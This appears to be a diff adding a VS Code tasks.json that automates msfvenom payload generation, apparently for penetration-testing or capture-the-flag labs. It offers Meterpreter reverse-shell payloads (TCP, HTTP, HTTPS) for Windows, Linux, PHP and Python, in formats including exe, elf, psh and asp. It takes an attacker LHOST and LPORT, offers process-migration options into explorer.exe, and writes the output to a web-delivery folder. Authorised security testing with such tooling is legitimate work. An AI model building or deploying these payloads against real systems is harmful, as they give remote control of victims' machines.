@@ -1,0 +1,96 @@
+{
+    "version": "2.0.0",
+    "tasks": [
+        {
+            "label": "msfvenom payload creating",
+            "type": "shell",
+            "detail": "msfvenom payload creating task",
+            "problemMatcher": [],
+            "command": [
+                "msfvenom",
+                "-p",
+                "${input:msfvenom-payload}",
+                "LHOST=${input:msfvenom-lhost}",
+                "LPORT=${input:msfvenom-lport}",
+                "${input:msfvenom-payload-advanced-options}",
+                "-f",
+                "${input:msfvenom-format}",
+                "-o",
+                "${workspaceFolder}/.web-delivery/1.${input:msfvenom-format}"
+            ],
+            "presentation": {
+                "echo": true,
+                "reveal": "always",
+                "focus": false,
+                "panel": "new",
+                "showReuseMessage": false,
+                "clear": true,
+                "close": false
+            },
+            "runOptions": {
+                "runOn": "default"
+            },
+            "isBackground": false,
+            "promptOnClose": true,
+            "hide": false,
+        }
+    ],
+    "inputs": [
+        {
+            "id": "msfvenom-payload",
+            "type": "pickString",
+            "description": "Select the payload",
+            "options": [
+                "windows/x64/meterpreter/reverse_tcp", // Staged
+                "windows/meterpreter/reverse_tcp",
+                "linux/x64/meterpreter/reverse_tcp",
+                "linux/x86/meterpreter/reverse_tcp",
+                "php/meterpreter/reverse_tcp",
+                "python/meterpreter/reverse_tcp",
+                "windows/meterpreter/reverse_http",
+                "windows/x64/meterpreter/reverse_http",
+                "windows/meterpreter/reverse_https",
+                "windows/x64/meterpreter/reverse_https",
+            ]
+        },
+        {
+            "id": "msfvenom-format",
+            "type": "pickString",
+            "description": "Select the format of the payload",
+            "options": [
+                "exe",
+                "elf",
+                "elf-so",
+                "exe-service",
+                "psh",
+                "php",
+                "jsp",
+                "asp"
+            ]
+        },
+        {
+            "id": "msfvenom-lhost",
+            "type": "promptString",
+            "description": "Enter the LHOST",
+            "default": "10.10.",
+        },
+        {
+            "id": "msfvenom-lport",
+            "type": "promptString",
+            "description": "Enter the LPORT",
+            "default": "6789",
+        },
+        {
+            "id": "msfvenom-payload-advanced-options",
+            "type": "pickString",
+            "description": "Enter the advanced options",
+            "default": "",
+            "options": [
+                "",
+                "PrependMigrate=true PrependMigrateProc=explorer.exe",
+                "PrependFork=true",
+                "PrependSetuid=true",
+            ]
+        }
+    ]
+}
